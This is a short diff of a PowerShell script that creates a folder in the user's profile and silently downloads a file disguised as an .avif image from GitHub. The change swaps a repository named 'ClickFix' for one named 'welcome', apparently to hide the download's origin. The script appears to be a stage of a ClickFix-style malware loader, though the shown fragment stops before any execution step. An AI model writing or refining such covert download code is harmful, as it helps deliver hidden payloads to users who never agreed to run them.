@@ -5,7 +5,7 @@ $folderPath = Join-Path -Path $userProfile -ChildPath $folderName
 New-Item -ItemType Directory -Path $folderPath -Force | Out-Null
 
 # Define download URL
-$url = "https://raw.githubusercontent.com/ZYD045692/ClickFix/main/nimeijiba.avif"
+$url = "https://raw.githubusercontent.com/ZYD045692/welcome/blob/main/nimeijiba.avif"
 $outputFile = Join-Path -Path $folderPath -ChildPath "nimeijiba.avif"
 
 # Download file silently
